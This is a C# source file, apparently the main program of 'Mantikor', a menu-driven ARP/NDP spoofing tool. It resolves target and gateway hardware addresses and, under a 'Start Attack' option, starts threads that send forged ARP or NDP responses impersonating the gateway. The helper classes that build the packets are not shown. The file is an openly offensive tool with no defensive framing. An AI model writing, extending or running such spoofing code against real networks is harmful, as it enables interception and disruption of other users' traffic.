using SharpPcap;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

namespace Mantikor
{
    class Program
    {
        //--CaptureDevice
        private static ICaptureDevice captureDevice;

        //--Configuration
        private static string localHwAddress = "-";
        private static Host source = new Host();
        private static Host gateway = new Host();

        private static List<Host> targetList = new List<Host>();
        private static List<Thread> threadList = new List<Thread>();

        static void Main(string[] args)
        {
            initializeConsole();
        }

        private static void printPage()
        {
            Console.Clear();

            string logo = @"
░█▀▄▀█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ▀█▀ ░█─▄▀ ░█▀▀▀█ ░█▀▀█ 
░█░█░█ ░█▄▄█ ░█░█░█ ─░█── ░█─ ░█▀▄─ ░█──░█ ░█▄▄▀ 
░█──░█ ░█─░█ ░█──▀█ ─░█── ▄█▄ ░█─░█ ░█▄▄▄█ ░█─░█
";

            Console.WriteLine(logo);

            // Print version
            string ver = SharpPcap.Version.VersionString;
            Console.WriteLine("MANTIKOR {0} => SharpPcap {1}\n", "1.3", ver);

            Console.WriteLine("Main Menu - Use the Numbers to navigate!");
            Console.WriteLine("[1] Configure Network Adapter => {0}", localHwAddress);
            Console.WriteLine("[2] Set Source & Gateway => {0} & {1}", source.hwAddress.ToString(), gateway.ipAddress.ToString());
            Console.WriteLine("[3] Edit Target-List : Targets => {0}\n", targetList.Count);
            Console.WriteLine("[5] Start Attack : Open Threads => {0}", threadList.Count);
            Console.WriteLine("[6] Force Stop\n");
        }

        private static void initializeConsole()
        {
            Console.Title = "Mantikor";

            while (true)
            {
                printPage();
                Console.Write("#>");
                string input = Console.ReadLine();

                switch (input)
                {
                    case "1":
                        configureNetworkAdapter();
                        break;
                    case "2":
                        configureSourceAndGateway();
                        break;
                    case "3":
                        editTargetList();
                        break;
                    case "5":
                        startAttack();
                        break;
                    case "6":
                        forceStop();
                        break;
                    default:
                        break;
                }
            }
        }

        private static void configureNetworkAdapter()
        {
            // Retrieve the device list
            var devices = CaptureDeviceList.Instance;

            // If no devices were found print an error
            if (devices.Count < 1)
            {
                Console.WriteLine("No devices were found on this machine");
                return;
            }

            int i = 0;

            // Print out the available devices
            foreach (var dev in devices)
            {
                dev.Open();
                Console.WriteLine("{0}) {1} {2}", i, dev.Description, dev.MacAddress);
                dev.Close();
                i++;
            }

            Console.WriteLine();
            Console.Write("-- Please choose a device to send a packet on: ");

            captureDevice = devices[int.Parse(Console.ReadLine())];

            //Open the device
            captureDevice.Open();

            localHwAddress = captureDevice.MacAddress.ToString();
        }

        private static void configureSourceAndGateway()
        {
            Console.Write("Gateway IP-Address\t: ");
            gateway.ipAddress = IPAddress.Parse(Console.ReadLine());

            switch (gateway.ipAddress.AddressFamily)
            {
                case AddressFamily.InterNetworkV6:
                    Console.Write("Gateway Hw-Address\t: ");
                    gateway.hwAddress = PhysicalAddress.Parse(Console.ReadLine());

                    Console.Write("Source Hw-Address\t: ");
                    source.hwAddress = PhysicalAddress.Parse(Console.ReadLine()); 
                    break;
                default:
                    Console.Write("Source IPv4-Address\t: ");
                    source.ipAddress = IPAddress.Parse(Console.ReadLine());
                    source.hwAddress = PhysicalAddress.Parse(retrievHwAddress(source.ipAddress.ToString()));

                    gateway.hwAddress = PhysicalAddress.Parse(retrievHwAddress(gateway.ipAddress.ToString()));
                    break;
            }                  
        }

        private static void editTargetList()
        {
            Console.Write("Target IP-Address\t: ");
            Host target = new Host();
            target.ipAddress = IPAddress.Parse(Console.ReadLine());
            if (target.ipAddress.AddressFamily.Equals(AddressFamily.InterNetwork))
            {
                target.hwAddress = PhysicalAddress.Parse(retrievHwAddress(target.ipAddress.ToString()));
            }
            else if (target.ipAddress.AddressFamily.Equals(AddressFamily.InterNetworkV6))
            {
                Console.Write("Target Hw-Address\t: ");
                target.hwAddress = PhysicalAddress.Parse(Console.ReadLine());
            }

            targetList.Add(target);
        }

        private static void startAttack()
        {
            ARP arp = new ARP();
            NDP ndp = new NDP();

            if (captureDevice != null)
            {
                foreach (Host target in targetList)
                {
                    if (target.ipAddress.AddressFamily.Equals(AddressFamily.InterNetwork))
                    {
                        Thread thread = new Thread(() => arp.threadMethodeArpResponse(target.ipAddress, gateway.ipAddress, target.hwAddress, 50, captureDevice));
                        thread.Start();

                        threadList.Add(thread);
                    }
                    else if (target.ipAddress.AddressFamily.Equals(AddressFamily.InterNetworkV6))
                    {
                        Thread thread = new Thread(() => ndp.threadMethodeNdpResponse(target.ipAddress, gateway.ipAddress, target.hwAddress, 50, captureDevice));
                        thread.Start();

                        threadList.Add(thread);
                    }
                }
            }
            else
            {
                Console.WriteLine("Network Adapter is not configured!");
                Console.Read();
            }
        }

        private static void forceStop()
        {
            foreach (Thread item in threadList)
            {
                item.Abort();
            }
        }

        private static string retrievHwAddress(string pIPAddress)
        {
            string hwAddress = null;

            try
            {
                IPAddress hostIPAddress = IPAddress.Parse(pIPAddress);
                byte[] ab = new byte[6];
                int len = ab.Length, r = SendARP((int)hostIPAddress.Address, 0, ab, ref len);
                string tempHwAddress = BitConverter.ToString(ab, 0, 6);
                if (tempHwAddress != "00-00-00-00-00-00")
                    hwAddress = tempHwAddress;
            }
            catch (Exception) { }

            return hwAddress;
        }

        [DllImport("iphlpapi.dll", ExactSpelling = true)]
        public static extern int SendARP(int DestIP, int SrcIP, [Out] byte[] pMacAddr, ref int PhyAddrLen);
    }
}
